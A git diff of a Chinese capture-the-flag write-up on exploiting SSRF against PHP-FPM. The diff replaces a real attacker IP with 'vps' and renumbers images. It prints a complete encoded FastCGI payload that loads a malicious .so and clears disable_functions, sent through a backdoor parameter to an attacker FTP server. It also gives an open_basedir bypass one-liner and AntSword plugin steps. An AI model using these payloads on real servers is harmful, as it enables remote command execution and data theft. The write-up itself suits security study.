@@ -606,26 +606,28 @@ conn.close()
 带着我们Exp生成的Payload后的DATA部分去触发SSRF即可执行我们so文件中的命令
 
 ```
-/add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&file=ftp://aaa@47.93.248.221:23/123&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%029%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%ADPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
+/add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&file=ftp://aaa@vps:23/123&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%029%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%ADPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
 ```
 
 这里的端口是恶意ftp的端口
 
-![image-20211108190158699](images/13.png)
+```
+ftp://aaa@vps:23/123
+```
 
 拿到shell
 
-![image-20211108190234336](images/14.png)
+![image-20211108190234336](images/13.png)
 
 不是读flag的时候发现权限不允许
 
-![image-20211108190444115](images/15.png)
+![image-20211108190444115](images/14.png)
 
 看看SUID权限
 
 发现php有SUID权限
 
-![image-20211108190631700](images/16.png)
+![image-20211108190631700](images/15.png)
 
 直接进入php的交互shell,绕过open_basedir读取flag
 
@@ -633,7 +635,7 @@ conn.close()
 mkdir('T0WN');chdir('T0WN');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag');
 ```
 
-![image-20211108191225865](images/17.png)
+![image-20211108191225865](images/16.png)
 
 除此之外,这种去打FPM的可以用蚁剑的绕过disable_functions的插件一把梭,直接一键利用
 
@@ -652,15 +654,15 @@ antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js
 
 接着到`antSword-master\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js`中添加一个`127.0.0.1:9001`选项
 
-![image-20211115155906604](images/18.png)
+![image-20211115155906604](images/17.png)
 
 
 
 开始蚁剑也没连上,因为开启了代理设置
 
-![image-20211115154912136](images/19.png)
+![image-20211115154912136](images/18.png)
 
-![image-20211115154919603](images/20.png)
+![image-20211115154919603](images/19.png)
 
 注意添加Cookie
 
@@ -676,13 +678,13 @@ antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js
 
 选择fastcgi模式
 
-![image-20211115155110502](images/21.png)
+![image-20211115155110502](images/20.png)
 
-![image-20211115160837199](images/22.png)
+![image-20211115160837199](images/21.png)
 
 再连接.antproxy.php,这样密码就是1了
 
-![image-20211115161400674](images/23.png)
+![image-20211115161400674](images/22.png)
 
 进入后就可以看到根目录下的flag了
 
